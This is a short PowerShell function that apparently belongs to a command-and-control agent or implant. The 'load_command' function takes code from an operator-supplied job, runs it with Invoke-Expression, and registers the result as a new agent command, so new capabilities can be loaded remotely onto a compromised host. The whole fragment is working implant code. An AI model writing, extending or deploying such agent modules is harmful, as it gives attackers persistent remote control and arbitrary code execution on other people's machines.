function global:load_command {
    param($Job)
    try {
        $data = $Job.parameters | ConvertFrom-Json
        Write-Host $Job
        Invoke-Expression $data.code
        return [pscustomobject]@{
            completed = $true
            user_output = "Loaded commands"
            commands = @(
                [pscustomobject]@{
                    action = "add"
                    cmd = $data.cmd
                }
            )
        } | ConvertTo-Json -Depth 4 -Compress

    }
    catch {
        return [pscustomobject]@{
            completed = $true
            user_output = $error[0] | Out-String
            status = "error"
        } | ConvertTo-Json -Depth 4 -Compress
    }
}
$Script:Management_Commands['load_command'] = 'load_command' 